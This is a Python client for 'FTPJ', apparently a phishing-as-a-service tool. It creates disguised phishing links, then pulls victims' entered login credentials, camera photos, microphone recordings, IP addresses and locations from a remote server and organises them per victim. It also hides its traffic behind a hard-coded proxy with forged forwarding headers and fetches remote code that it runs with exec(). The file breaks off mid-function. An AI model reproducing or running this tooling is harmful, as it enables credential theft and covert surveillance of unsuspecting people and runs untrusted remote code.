import requests
import base64, os
import json, time
from urllib.parse import quote
import threading
import random
from fake_useragent import UserAgent
import socket
try:
	from googletrans import Translator
except:
	Translator = None

if os.name == "nt":
	exec("""import pyga"""+"""me.mixer;pygame.mixer.init()""", locals, locals)
elif os.path.exists("/storage/emulated/0/"):
	os.system("pkg install sox -y")
	pygame = "termux"
else:
	exec("""import pyga"""+"""me.mixer;pygame.mixer.init()""", locals, locals)

my_host = "https://wwwrrn.pythonanywhere.com"
loggers = {}
background_workers = 0
bot = requests.Session()
bot.proxies.update({"http": "socks5h://45.89.28.226:12915", "https": "socks5h://45.89.28.226:12915"})
domain_ip = {}
lock = threading.Lock()

def random_ip():
    while True:
        first_octet = random.randint(1, 223)
        if first_octet in {10, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239}:
            continue
        second_octet = random.randint(0, 255)
        third_octet = random.randint(0, 255)
        fourth_octet = random.randint(1, 254)
        if first_octet == 192 and second_octet == 168:
            continue
        return f"{first_octet}.{second_octet}.{third_octet}.{fourth_octet}" 
 
def random_ua():
	return UserAgent().random

def premius_request(method, url, headers={}, content="", timeout=3, params={}):
	global bot, domain_ip
	client_ip = random_ip()
	client_proxys = [random_ip() for _ in range(random.randint(3, 5))]
	ua = random_ua()
	proto = url[:url.find("://")]
	urld = url[url.find("://")+3:]
	urld = urld[:urld.find("/")]
	domain = urld
	urld = proto+"://"+urld
	if domain not in domain_ip:
		targetip = socket.gethostbyname(domain)
		with lock:
			domain_ip[domain] = targetip
	else:
		targetip = domain_ip[domain]
	xff = ",".join([client_ip]+client_proxys+[targetip])
	myheaders = {"User-Agent": ua, "X-Forwarded-For": xff, "X-Forwarded-Proto": proto, "X-Real-IP": client_ip, "X-Real-Ip": client_ip, "Server": "Premius", "DNT": "1", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9", "Referer": url, "Origin": urld, "X-Frame-Options": "SAMEORIGIN", "Connection": "keep-alive", "X-Client-IP": client_ip, "Authority": targetip, "HTTP_CLIENT_IP": client_ip, "HTTP_USER_AGENT": ua, "HTTP_X_FORWARDED_FOR": xff, "HTTP_X_REALHOST": client_ip}
	myheaders.update(headers)
	result = bot.request(method, url, headers=myheaders, data=content, timeout=timeout, params=params)
	return result

def play_music(file_path):
    global pygame
    if pygame != "termux":
        pygame.mixer.music.load(file_path)
        pygame.mixer.music.play()
    else:
    	os.system(f"play '{file_path}' > /dev/null 2>&1 &")

def play_one():
	listof = []
	for root, dirs, files in os.walk("Musics"):
		for file in files:
			listof.append("Musics/"+file)
	play_music(random.choice(listof))

def get_verify_key():
	global my_host
	return requests.request("FTPJ", my_host+"/fooltheprimejester/premiusjester/index/of/path/to/your/mom/A7F9D3B6E1C2G8H5J4K9L0MNPQRTVWXY/verify/Z4X8V1N7M3P0QW6R2T9K5JBLGCDYFAEH").text

def create_logger(input_name, output_name, adminput_name, redirect, key, max_logs):
	global my_host
	verify_key = get_verify_key()
	result = requests.request("FTPJ", my_host+"/fooltheprimejester/premiusjester/index/of/path/to/your/mom/MNPQW9X7J3K5T2V1G8D6R4B0LCAFYEHZ/create_logger/R2T9K5JBLGCDYFAEHZ4X8V1N7M3P0QW6", json={"temp_verify_key": verify_key, "input": input_name, "output": output_name, "adminput": adminput_name, "redirect": redirect, "key": key, "max_logs": max_logs})
	code = result.json()
	if code["status"] == True:
		return code["text"]
	else:
		raise SystemError(code["text"])

def premiustool():
	global my_host
	key = input("Enter SSP Key: ")
	tempkey = get_verify_key()
	result = requests.request("FTPJ", my_host+"/fooltheprimejester/premiusjester/index/of/path/to/your/mom/O2N9S39WJ2OR0D82N/ftpj_premiustool/82JS92O2OWOXN3NRIZ73N?temp_verify_key="+tempkey+"&key="+key).text
	if result.startswith("Error:"):
		print(result)
	else:
		exec(result)
	input("[ Enter ]")

def show_all(adminput):
	global my_host
	verify_key = get_verify_key()
	result = requests.request("FTPJ", my_host+"/fooltheprimejester/premiusjester/index/of/path/to/your/mom/QHDO2ND92NW9S82NW9/show_all_off/GWKWBDOWPQOWOXUN38D63NW8?temp_verify_key="+verify_key+"&adminput="+adminput)
	if result.status_code == 400:
		raise SystemError(result.text)
	else:
		return result.json()

def help():
	global my_host
	return requests.request("FTPJ", my_host+"/fooltheprimejester/premiusjester/index/of/path/to/your/mom/OWOWNZO2N28TUSN/help/MXBEK39W8XH2OW9ZH").text.replace("<!my_host!>", my_host)

def logger_link_generator(i=None):
	global my_host
	print("Logger Link Generator\n\n")
	print(help())
	print()
	if i == None:
		i = quote(input("Output Identity: "))
	t = input("Page Type Codename: ").strip()
	q = input("Query (Automatic converting to base64) (OPTIONAL): ")
	if len(q) == 0:
		print(my_host+"/check?i="+i+"&t="+t)
	else:
		q = base64.b64encode(q.encode("utf-8", errors="ignore")).decode("utf-8", errors="ignore")
		print(my_host+"/check?i="+i+"&t="+t+"&q="+q)
	print()
	input("[ Enter ]")

def download_and_save(directory, inputt, output, adminput):
			try:
				data = show_all(adminput)
				try:
					os.mkdir(directory)
				except:
					pass
				mainpath = os.getcwd()
				os.chdir(directory)
				with open("all_data.json", "w") as f:
					f.write(json.dumps(data, indent=4))
				for h, v in data["logs"].items():
					try:
						os.mkdir(h)
					except:
						pass
					os.chdir(h)
					if h == "access" or h == "ifconfig" or h == "account":
						n = 1
						for dat in v:
							with open(f"{n}.json", "w") as f:
								f.write(json.dumps(dat, indent=4))
							n += 1
					elif h == "camera":
						n = 1
						for dat in v:
							with open(f"{n}.json", "w") as f:
								f.write(json.dumps(dat, indent=4))
							with open(f"{n}.jpg", "wb") as f:
								c = dat["data"]["data"]
								c = c[c.find("base64,")+7:]
								c = base64.b64decode(c.encode())
								f.write(c)
							n += 1
					elif h == "microphone":
						n = 1
						for dat in v:
							with open(f"{n}.json", "w") as f:
								f.write(json.dumps(dat, indent=4))
							with open(f"{n}.wav", "w") as f:
								c = dat["data"]["data"]
								c = c[c.find("base64,")+7:]
								c = base64.b64decode(c.encode())
								f.write(c)
							n += 1
					os.chdir("..")
				os.chdir(mainpath)
			except Exception as e:
				print("Error:", str(e))

def loggermenu(inputt, output, adminput, loggername):
	while True:
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		print("""\033[92m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \033[0m""")
		print(f"\033[91mFool\033[93mThePrimeJester\033[0m \033[96mPython Client > My Loggers > {loggername}\033[92m\n")
		print(f"Don't Share This Informations: \nInput: {inputt}\nOutput: {output}\nAdminput: {adminput}\nPlease don't share this informations but you can save on your notepad.\n\n")
		print("> General <")
		print()
		print("[ 1 ] Generate a Link for Phishing")
		print("[ 2 ] Download and save everything in this logger")
		print("[ 3 ] Loop for Download and save")
		print("[ 4 ] Background Loop for Download and save")
		print("[ 5 ] View Logs (Recommended For Starters)")
		print("[ 6 ] Activity Table by Modeling Users")
		print()
		print("> Help Center <")
		print()
		print("[ H1 ] I am getting an adminput error")
		print("[ H2 ] The phishing links I created do not work")
		print("[ H3 ] How to change input/output/adminput values")
		print("[ H4 ] How can I delete my own logger?")
		print()
		print("[ 0 ] Exit from this menu")
		print()
		i = input(">> ").strip().lower()
		print()
		if i == "h1":
			print("""If you're encountering an "adminput" error, here are some possible causes:
1. The adminput may have been incorrectly processed and saved by the client program.
2. The adminput value entered by you might be incorrect (this usually occurs when trying to load an already existing FTPJ logger).
3. There could be internet connectivity issues.
Solution: First, make sure you enter and use the adminput correctly. Avoid using special characters, ensure there are no spaces, and check that the length is no longer than 32 characters. If you're not using an official client from the GitHub repository, try switching to a different client. You can find the official client here: https://github.com/aertsimon90/FTPJ""")
			print()
			input("[ Enter ]")
		elif i == "h2":
			print("""If the links you’ve created are not generating logs correctly, there are usually a few possible reasons:
1. The output value may have been entered incorrectly.
2. The output value you entered might be incorrect (this often happens when trying to load an already existing FTPJ logger).
3. There could be internet connectivity issues.
Solution: First, make sure to enter and use the output value correctly. Avoid using special characters, ensure there are no spaces, and check that the length does not exceed 32 characters. If you're not using an official client from the GitHub repository, try switching to a different client. You can find the official client here: https://github.com/aertsimon90/FTPJ""")
			print()
			input("[ Enter ]")
		elif i == "h3":
			print("""FTPJ does not allow you to change these types of values.""")
			print()
			input("[ Enter ]")
		elif i == "h4":
			print("""First, it is not possible for you to delete your own logger.
The only way a logger can be deleted is if the expiration date of your key has passed or if the key becomes invalid. Once your key is invalid, your logger will be automatically deleted.
However, since multiple loggers can be created with a single key, all loggers created with that key will be deleted at once.""")
			print()
			input("[ Enter ]")
		elif i == "1":
			logger_link_generator(i=output)
		elif i == "2":
			directory = input("Enter directory name or path (e.g. logsofmylogger): ")
			download_and_save(directory, inputt, output, adminput)
			input("[ Enter ]")
		elif i == "3":
			directory = input("Enter directory name or path (e.g. logsofmylogger): ")
			loop_download_and_save(directory, inputt, output, adminput)
			input("[ Enter ]")
		elif i == "4":
			directory = input("Enter directory name or path (e.g. logsofmylogger): ")
			threading.Thread(target=loop_download_and_save, args=(directory, inputt, output, adminput)).start()
			input("[ Enter ]")
		elif i == "6":
			directory = input("Enter directory name or path (e.g. logsofmylogger): ")
			format = input("Enter table format (json/text): ").lower()
			if format.startswith("j"):
				format = "json"
			else:
				format = "text"
			download_and_save(directory, inputt, output, adminput)
			users = {}
			os.chdir(directory)
			os.chdir("access")
			print("\033[92m[ Access Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data = json.loads(f.read())["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/access/"+h
					user = remote_addr
					if user not in users:
						users[user] = {"access": [], "account": [], "ifconfig": [], "camera": [], "microphone": []}
					users[user]["access"].append({"time": full_time, "remote_addr": remote_addr, "remote_port": remote_port, "user_agent": ua, "uri": uri, "city": city, "region": region, "file_path": file_path})
			os.chdir("..")
			os.chdir("account")
			print("\033[92m[ Account Log In Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/account/"+h
					accountdata = data2["data"]["data"]
					user = remote_addr
					if user not in users:
						users[user] = {"access": [], "account": [], "ifconfig": [], "camera": [], "microphone": []}
					users[user]["account"].append({"time": full_time, "remote_addr": remote_addr, "remote_port": remote_port, "user_agent": ua, "uri": uri, "city": city, "region": region, "file_path": file_path, "inputs": accountdata})
			os.chdir("..")
			os.chdir("camera")
			print("\033[92m[ Camera Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					name = h[:h.find(".")]
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/camera/"+h
					camera_file_path = directory+"/camera/"+name+".jpg"
					user = remote_addr
					if user not in users:
						users[user] = {"access": [], "account": [], "ifconfig": [], "camera": [], "microphone": []}
					users[user]["camera"].append({"time": full_time, "remote_addr": remote_addr, "remote_port": remote_port, "user_agent": ua, "uri": uri, "city": city, "region": region, "file_path": file_path, "picture": camera_file_path})
			os.chdir("..")
			os.chdir("microphone")
			print("\033[92m[ Microphone Records ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					name = h[:h.find(".")]
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/microphone/"+h
					sound_file_path = directory+"/microphone/"+name+".wav"
					user = remote_addr
					if user not in users:
						users[user] = {"access": [], "account": [], "ifconfig": [], "camera": [], "microphone": []}
					users[user]["microphone"].append({"time": full_time, "remote_addr": remote_addr, "remote_port": remote_port, "user_agent": ua, "uri": uri, "city": city, "region": region, "file_path": file_path, "record": sound_file_path})
			os.chdir("..")
			os.chdir("ifconfig")
			print("\033[92m[ Recorded Web Information ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data = json.loads(f.read())["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/ifconfig/"+h
					user = remote_addr
					if user not in users:
						users[user] = {"access": [], "account": [], "ifconfig": [], "camera": [], "microphone": []}
					users[user]["ifconfig"].append({"time": full_time, "remote_addr": remote_addr, "remote_port": remote_port, "user_agent": ua, "uri": uri, "city": city, "region": region, "file_path": file_path})
			os.chdir("../..")
			if format == "json":
				resultdata = json.dumps(users, indent=4, default=repr)
			else:
				resultsdata = []
				for user, logs in users.items():
					head = f"| <+>>>> {user} <<<<+> |"
					resultsdata.append(head)
					for head2, logs2 in logs.items():
						data = []
						head2 = f"| >>>>  {head2.upper()}"
						data.append(head2)
						for h in logs2:
							for head3, logs3 in h.items():
								data.append(f"| > {head3.upper().replace('_', ' ')} : {logs3}")
						data = "\n".join(data)
						resultsdata.append(data)
				resultdata = "\n\n".join(resultsdata)
			print(resultdata)
			save = input("If you want to save data, enter a file name or path (optional): ").strip()
			if save != "":
				with open(save, "w") as f:
					f.write(resultdata)
			input("[ Enter ]")
		elif i == "5":
			directory = input("Enter directory name or path (e.g. logsofmylogger): ")
			download_and_save(directory, inputt, output, adminput)
			os.chdir(directory)
			os.chdir("access")
			print("\033[92m[ Access Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data = json.loads(f.read())["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/access/"+h
					print(f"\033[93m[ Page opened on \033[92m{full_time}\033[93m ]")
					print()
					print(f"\033[92mIP Address >> \033[0m{remote_addr}")
					print(f"\033[92mSocket Port >> \033[0m{remote_port}")
					print(f"\033[92mUser Agent >> \033[0m{ua}")
					print(f"\033[92mURI Path >> \033[0m{uri}")
					print(f"\033[92mCity >> \033[0m{city}")
					print(f"\033[92mRegion >> \033[0m{region}")
					print(f"\033[92mFull File >> \033[0m{file_path}")
					print()
			os.chdir("..")
			os.chdir("account")
			print("\033[92m[ Account Log In Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/account/"+h
					accountdata = data2["data"]["data"]
					print(f"\033[93m[ Account logged on \033[92m{full_time}\033[93m ]")
					print()
					print(f"\033[92mIP Address >> \033[0m{remote_addr}")
					print(f"\033[92mSocket Port >> \033[0m{remote_port}")
					print(f"\033[92mUser Agent >> \033[0m{ua}")
					print(f"\033[92mURI Path >> \033[0m{uri}")
					print(f"\033[92mCity >> \033[0m{city}")
					print(f"\033[92mRegion >> \033[0m{region}")
					print(f"\033[93mAccount Log In >> \033[0m{accountdata}")
					print(f"\033[92mFull File >> \033[0m{file_path}")
					print()
			os.chdir("..")
			os.chdir("camera")
			print("\033[92m[ Camera Logs ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					name = h[:h.find(".")]
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/camera/"+h
					camera_file_path = directory+"/camera/"+name+".jpg"
					print(f"\033[93m[ Picture captured on \033[92m{full_time}\033[93m ]")
					print()
					print(f"\033[92mIP Address >> \033[0m{remote_addr}")
					print(f"\033[92mSocket Port >> \033[0m{remote_port}")
					print(f"\033[92mUser Agent >> \033[0m{ua}")
					print(f"\033[92mURI Path >> \033[0m{uri}")
					print(f"\033[92mCity >> \033[0m{city}")
					print(f"\033[92mRegion >> \033[0m{region}")
					print(f"\033[93mCamera Picture File >> \033[0m{camera_file_path}")
					print(f"\033[92mFull File >> \033[0m{file_path}")
					print()
			os.chdir("..")
			os.chdir("microphone")
			print("\033[92m[ Microphone Records ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					name = h[:h.find(".")]
					with open(h, "r") as f:
						data2 = json.loads(f.read())
					data = data2["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/microphone/"+h
					sound_file_path = directory+"/microphone/"+name+".wav"
					print(f"\033[93m[ Microphone recorded on \033[92m{full_time}\033[93m ]")
					print()
					print(f"\033[92mIP Address >> \033[0m{remote_addr}")
					print(f"\033[92mSocket Port >> \033[0m{remote_port}")
					print(f"\033[92mUser Agent >> \033[0m{ua}")
					print(f"\033[92mURI Path >> \033[0m{uri}")
					print(f"\033[92mCity >> \033[0m{city}")
					print(f"\033[92mRegion >> \033[0m{region}")
					print(f"\033[93mMicrophone Record File >> \033[0m{sound_file_path}")
					print(f"\033[92mFull File >> \033[0m{file_path}")
					print()
			os.chdir("..")
			os.chdir("ifconfig")
			print("\033[92m[ Recorded Web Information ]\033[0m")
			print()
			for h in os.listdir():
				if h.endswith(".json"):
					with open(h, "r") as f:
						data = json.loads(f.read())["auto_data"]
					if "lookup" not in data:
						data["lookup"] = {}
					remote_addr = data["remote_addr"]
					remote_port = data["remote_port"]
					ua = data["headers"].get("User-Agent", "")
					try:
						uri = data["environ"].get("REQUEST_URI", "")
					except:
						uri = "Environ disabled for starter accounts."
					city = data["lookup"].get("city", "")
					region = data["lookup"].get("region", "")
					full_time = data["full_time"]
					file_path = directory+"/ifconfig/"+h
					print(f"\033[93m[ Recorded web information on \033[92m{full_time}\033[93m ]")
					print()
					print(f"\033[92mIP Address >> \033[0m{remote_addr}")
					print(f"\033[92mSocket Port >> \033[0m{remote_port}")
					print(f"\033[92mUser Agent >> \033[0m{ua}")
					print(f"\033[92mURI Path >> \033[0m{uri}")
					print(f"\033[92mCity >> \033[0m{city}")
					print(f"\033[92mRegion >> \033[0m{region}")
					print(f"\033[92mFull File >> \033[0m{file_path}")
					print()
			os.chdir("../..")
			input("[ Enter ]")
		elif i == "0":
			break

def loop_download_and_save(directory, inputt, output, adminput):
	global background_workers
	with lock:
		background_workers += 1
	while True:
		try:
			download_and_save(directory, inputt, output, adminput)
		except Exception as e:
			print(e)
		time.sleep(1*background_workers)
	with lock:
		background_workers -= 1

def myloggersmenu():
	global loggers
	try:
		with open(os.path.join(os.path.expanduser("~"), ".ftpj.json"), "r") as f:
			loggers = json.loads(f.read())
	except:
		pass
	while True:
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		print("""\033[92m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \033[0m""")
		print("\033[91mFool\033[93mThePrimeJester\033[0m \033[96mPython Client > My Loggers\033[0m\n")
		n = 0
		nums = {}
		for logger in loggers:
			n += 1
			nums[str(n)] = logger
			print(f"\033[94m[\033[93m {n} \033[94m]\033[96m {logger}\033[0m")
		if len(loggers) == 0:
			print("\033[90mHas no loggers available...\033[0m")
		print()
		print(f"\033[94m[\033[93m {n+1} \033[94m]\033[96m Create New/Update Logger\033[0m")
		print(f"\033[94m[\033[93m {n+2} \033[94m]\033[96m Open Logger\033[0m")
		print(f"\033[94m[\033[93m {n+3} \033[94m]\033[96m Remove Logger\033[0m")
		print()
		print("\033[94m[\033[93m 0 \033[94m]\033[91m Exit from My Loggers\033[0m")
		print()
		i = input(">> ").strip()
		print()
		if i in nums:
			ii = loggers[nums[i]]
			inputt = ii[0];output = ii[1];adminput = ii[2]
			loggermenu(inputt[:32], output[:32], adminput[:32], nums[i])
		elif i == str(n+1):
			inputt = input("Enter Input Name (Name recorded in FTPJ Database) (e.g. mylogger123): ")[:32]
			output = input("Enter Output Name (Name appearing in Phishing/Logging links) (e.g. GoogleLogin): ")[:32]
			adminput = input("Enter Adminput Name (Key input name used when controlling the Logger) (e.g. oN83nndHwos9J29du) (We recommend that it be strong): ")[:32]
			redirect = input("Enter Redirect URL (The internet address that will be opened when the phishing ends) (e.g. https://google.com): ")
			key = input("FTPJ Account Key (Token of your account for FTPJ) (e.g. ww122ndkk29sjb4) (If you don't have the key, you can use the free keys from the github repo or contact Simon Scap directly. simon.scap090@gmail.com) (When the key expires, you must search for a new key): ")
			max_logs = input("Maximum Log Limit (The maximum number of logs your phishing link will keep) (In starter accounts this value can be up to 100) (e.g. 99): ")
			print("Trying Create...")
			try:
				print("Status:", create_logger(inputt, output, adminput, redirect, key, max_logs))
				i = input("Name will save on local-based logger list (e.g. mylogger123): ")
				loggers[i] = [inputt, output, adminput]
			except Exception as e:
				print("Error:", str(e))
			input("[ Enter ]")
		elif i == str(n+2):
			inputt = input("Enter Input Name (Name recorded in FTPJ Database) (e.g. mylogger123): ")
			output = input("Enter Output Name (Name appearing in Phishing/Logging links) (e.g. GoogleLogin): ")
			adminput = input("Enter Adminput Name (Key input name used when controlling the Logger) (e.g. oN83nndHwos9J29duMwpw8d6) (We recommend that it be strong): ")
			i = input("Name will save on local-based logger list (e.g. mylogger123): ")
			loggers[i] = [inputt, output, adminput]
		elif i == str(n+3):
			i = input("Name will saved on local-based logger list (e.g. mylogger123): ")
			if i in loggers:
				del loggers[i]
		elif i == "0":
			break
		with open(os.path.join(os.path.expanduser("~"), ".ftpj.json"), "w") as f:
			f.write(json.dumps(loggers))

def client_options():
	global my_host, loggers, background_workers, domain_ip
	while True:
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		print("""\033[92m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \033[0m""")
		print("\033[91mFool\033[93mThePrimeJester\033[0m \033[96mPython Client > Client Options\033[0m\n\n\033[94m[\033[93m 1 \033[94m]\033[96m Show Variables\n\033[94m[\033[93m 2 \033[94m]\033[96m Change Variables\n\n\033[94m[\033[93m 0 \033[94m]\033[96m \033[91mExit from Client Options\n\033[92m")
		i = input(">> ").strip()
		if i == "1":
			variables = {"my_host": my_host, "loggers": loggers, "domain_ip": domain_ip}
			print(repr(variables))
			input("[ Enter ]")
		elif i == "2":
			variables = {"my_host": my_host, "loggers": loggers, "domain_ip": domain_ip}
			with open("temp_variables.dict", "w") as f:
				f.write(repr(variables))
			if os.name == "nt":
				os.system("notepad temp_variables.dict")
			else:
				os.system("nano temp_variables.dict")
			with open("temp_variables.dict", "r") as f:
				variables = eval(f.read())
			my_host = variables["my_host"]
			loggers = variables["loggers"]
			domain_ip = variables["domain_ip"]
		elif i == "0":
			break

def superkey_generate(key1, key2, key3):
	n = 1.3827284728283
	newkey = ""
	for h in key1:
		for h2 in key2:
			for h3 in key3:
				newkey += h+h2+h3
				n += ord(h)
				n += ord(h2)
				n += ord(h3)
	superkey = ""
	for h in newkey:
		h = int((ord(h)+2282738282738)*n)%1114112
		if h%2 == 0:
			n = n*1.18373727373
		else:
			n = n/1.18237282738
		superkey += chr(h)
	return superkey
def encrypt(content, key):
	content = "t/"+str(content)
	keyn = 0
	for h in key:
		keyn += ord(h)**1.28264927264
		keyn = keyn/1.382628472
		keyn = keyn*1.372638388
	keyn = keyn**2.31693169
	keyn = int(keyn)
	if keyn%2 == 0:
		keyn = -keyn
	new_content = ""
	for h in content:
		h = ord(h)
		new_content += chr((h+keyn)%1114112)
		keyn = int(keyn*1.383727384)
		keyn += int(h**2.4826272847)
	return new_content
def decrypt(content, key):
	keyn = 0
	for h in key:
		keyn += ord(h)**1.28264927264
		keyn = keyn/1.382628472
		keyn = keyn*1.372638388
	keyn = keyn**2.31693169
	keyn = int(keyn)
	if keyn%2 == 0:
		keyn = -keyn
	new_content = ""
	for h in content:
		h = ord(h)
		h = (h-keyn)%1114112
		keyn = int(keyn*1.383727384)
		new_content += chr(h)
		keyn += int(h**2.4826272847)
	if new_content.startswith("t/"):
		return new_content[2:]
	else:
		raise ValueError("Error: Incorrect Key for decryption")
def secret_notepad():
	editor = input("You have Notepad or Nano file editor? (Y/n): ").lower()
	if "y" in editor:
		editor = True
	else:
		editor = False
	superkey = None
	secretdatabase = {}
	secretfile = os.path.join(os.path.expanduser("~"), ".secret_notepad_database")
	if os.path.exists(secretfile):
		try:
			with open(secretfile, "r") as f:
				c = f.read()
			c = json.loads(c)["data"]
			c = decrypt(c, "FTPJ Babaprodur gerisi yalandır moruq")
			secretdatabase = json.loads(c)
		except:
			pass
	while True:
		with open(secretfile, "w") as f:
			f.write(json.dumps({"data": encrypt(json.dumps(secretdatabase), "FTPJ Babaprodur gerisi yalandır moruq")}))
			f.flush()
		if os.name == "nt":
			os.system("cls")
		else:
			os.system("clear")
		print("""\033[90m███████╗████████╗██████╗     ██╗
██╔════╝╚══██╔══╝██╔══██╗    ██║
█████╗     ██║   ██████╔╝    ██║
██╔══╝     ██║   ██╔═══╝██   ██║
██║        ██║   ██║    ╚█████╔╝
╚═╝        ╚═╝   ╚═╝     ╚════╝ 
                                \n""")
		print(f"\nSecret Database: {secretfile}\n")
		print("[ 1 ] Enter Secret Notepad Keys")
		print("[ 2 ] Create/Update Note")
		print("[ 3 ] Read Note")
		print()
		print("[ 0 ] Exit from Secret Notepad")
		print()
		i = input(">> ").strip()
		if i == "1":
			print("""The passwords you enter are perfectly hashed and transformed into a unique, very strong password. According to the algorithm, first, all keys are added to a list based on all possible combinations of all characters of the passwords. For example, if all your passwords are 5 characters long, a number with 5*5*5*3 characters will be created. Or, if one of your passwords is 7 characters long, another is 2 characters, and another is 15 characters long, the resulting password will be 7*5*15*3 characters long. The last number, 3, comes from the fact that all combinations are derived from 3 characters. For example, Password 1: hello, Password 2: hi, Password 3: hell. The result consists of all combinations of all characters from the passwords, meaning the first combination will be "hhh", the second will be "hhe", the third will be "hhl", and so on, following a combinatorial path until the final password is formed, such as "oil", because the last characters of the passwords are o, i, and l. After this, these combinations are merged and then passed through a complex hashing system. However, the hash system does not change the length, which makes it more unique.""")
			print()
			key1 = input("\033[0m\033[90mEnter Key 1: \033[30m")
			key2 = input("\033[0m\033[90mEnter Key 2: \033[30m")
			key3 = input("\033[0m\033[90mEnter Key 3: \033[30m")
			print("\033[0m\033[90mGenerating Super Key...")
			superkey = superkey_generate(key1, key2, key3)
			print(f"Length of Super Key: {len(superkey)} characters")
			print()
			input("[ Enter ]")
		elif i == "2":
			if superkey == None:
				input("[ Super Key is not found. Please generate keys ]")
			name = input("Name of note: ")
			name = encrypt(name, superkey)
			with open("temp_content.txt", "w") as f:
				f.write("Note content...")
			if editor:
				if os.name == "nt":
					os.system("notepad temp_content.txt")
				else:
					os.system("nano temp_content.txt")
				input("[ If you finished your work, enter ]")
			else:
				with open("temp_content.txt", "w") as f:
